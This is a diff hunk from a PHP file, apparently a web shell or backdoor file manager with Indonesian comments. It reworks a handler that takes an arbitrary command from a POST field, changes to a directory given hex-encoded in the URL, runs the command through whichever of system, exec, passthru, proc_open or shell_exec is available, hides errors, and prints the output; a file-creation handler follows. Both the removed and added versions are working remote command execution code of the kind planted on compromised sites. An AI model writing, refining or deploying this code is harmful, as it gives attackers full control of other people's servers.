@@ -403,97 +403,80 @@
             }
         }
         // CMD sesuai dengan direktori di URL
-if (isset($_POST['cmd'])) {
-    $cmd = $_POST['cmd'];  // Menggunakan variabel $cmd sesuai kode Anda
-    $path = isset($_GET['path']) ? unhex($_GET['path']) : getcwd();
-    chdir($path);  // Berpindah ke direktori target jika diperlukan
-    echo "<div class='mt-4'>";
-
-    $output = '';      // Variabel untuk menyimpan output
-    $resultCode = 1;   // Default nilai result code untuk error
-
-    // Cek dan gunakan system()
-    if (function_exists('system')) {
-        @ob_start();
-        @system($cmd, $resultCode);
-        $output = @ob_get_contents();
-        @ob_end_clean();
-        if (!empty($output)) {
-            echo "<pre>Result Code: $resultCode</pre>";
-            echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
-            echo "</div>";
-        }
-    }
-    // Cek dan gunakan exec() jika system() tidak ada output
-    else if (function_exists('exec')) {
-        $results = [];
-        @exec($cmd, $results, $resultCode);
-        if (!empty($results)) {
-            $output = implode("\n", $results);
-            echo "<pre>Result Code: $resultCode</pre>";
-            echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
-            echo "</div>";
-        }
-    }
-    // Cek dan gunakan passthru() jika exec() tidak ada output
-    else if (function_exists('passthru')) {
-        @ob_start();
-        @passthru($cmd, $resultCode);
-        $output = @ob_get_contents();
-        @ob_end_clean();
-        if (!empty($output)) {
-            echo "<pre>Result Code: $resultCode</pre>";
-            echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
-            echo "</div>";
-        }
-    }
-    // Cek dan gunakan proc_open() jika passthru() tidak ada output
-    else if (function_exists('proc_open')) {
-        $descriptorspec = [
-            0 => ["pipe", "r"],  // stdin
-            1 => ["pipe", "w"],  // stdout
-            2 => ["pipe", "w"]   // stderr
-        ];
-        $process = @proc_open($cmd, $descriptorspec, $pipes);
-        if (is_resource($process)) {
-            $output = @stream_get_contents($pipes[1]);
-            $stderr = @stream_get_contents($pipes[2]);  // Menangkap stderr
-            @fclose($pipes[0]);
-            @fclose($pipes[1]);
-            @fclose($pipes[2]);
-            $resultCode = @proc_close($process);
-
-            // Menampilkan stderr jika ada
-            if (!empty($stderr)) {
-                echo "<pre>Error: " . htmlspecialchars($stderr, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+        if (isset($_POST['cmd'])) {
+            $cmd = $_POST['cmd'];
+            $path = isset($_GET['path']) ? unhex($_GET['path']) : getcwd();
+            chdir($path);
+            echo "<div class='mt-4'>";
+            $output = '';
+            $resultCode = 1;
+            if (function_exists('system')) {
+                @ob_start();
+                @system($cmd, $resultCode);
+                $output = @ob_get_contents();
+                @ob_end_clean();
+                if (!empty($output)) {
+                    echo "<pre>Result Code: $resultCode</pre>";
+                    echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+                    echo "</div>";
+                }
             }
-
-            if (!empty($output)) {
+            else if (function_exists('exec')) {
+                $results = [];
+                @exec($cmd, $results, $resultCode);
+                if (!empty($results)) {
+                    $output = implode("\n", $results);
+                    echo "<pre>Result Code: $resultCode</pre>";
+                    echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+                    echo "</div>";
+                }
+            }
+            else if (function_exists('passthru')) {
+                @ob_start();
+                @passthru($cmd, $resultCode);
+                $output = @ob_get_contents();
+                @ob_end_clean();
+                if (!empty($output)) {
+                    echo "<pre>Result Code: $resultCode</pre>";
+                    echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+                    echo "</div>";
+                }
+            }
+            else if (function_exists('proc_open')) {
+                $descriptorspec = [
+                    0 => ["pipe", "r"],
+                    1 => ["pipe", "w"],
+                    2 => ["pipe", "w"]
+                ];
+                $process = @proc_open($cmd, $descriptorspec, $pipes);
+                if (is_resource($process)) {
+                    $output = @stream_get_contents($pipes[1]);
+                    @fclose($pipes[0]);
+                    @fclose($pipes[1]);
+                    @fclose($pipes[2]);
+                    $resultCode = @proc_close($process);
+                    if (!empty($output)) {
+                        echo "<pre>Result Code: $resultCode</pre>";
+                        echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+                        echo "</div>";
+                    }
+                }
+            }
+            else if (function_exists('shell_exec')) {
+                $output = @shell_exec($cmd);
+                $resultCode = ($output === null) ? 1 : 0;
+                if (!empty($output)) {
+                    echo "<pre>Result Code: $resultCode</pre>";
+                    echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+                    echo "</div>";
+                }
+            }
+            else {
                 echo "<pre>Result Code: $resultCode</pre>";
-                echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+                echo "<pre>$output</pre>";
                 echo "</div>";
             }
         }
-    }
-    // Cek dan gunakan shell_exec() jika proc_open() tidak ada output
-    else if (function_exists('shell_exec')) {
-        $output = @shell_exec($cmd);
-        $resultCode = ($output === null) ? 1 : 0; // Jika output null, anggap gagal
-        if (!empty($output)) {
-            echo "<pre>Result Code: $resultCode</pre>";
-            echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
-            echo "</div>";
-        } else {
-            echo "<pre>No output or command failed.</pre>";
-        }
-    }
-    else {
-        echo "<pre>Result Code: $resultCode</pre>";
-        echo "<pre>No output generated or command failed.</pre>";
-        echo "</div>";
-    }
-}
-
         // Create a new file
         if (isset($_POST['createFile'])) {
             $fileName = $_POST['fileName'];
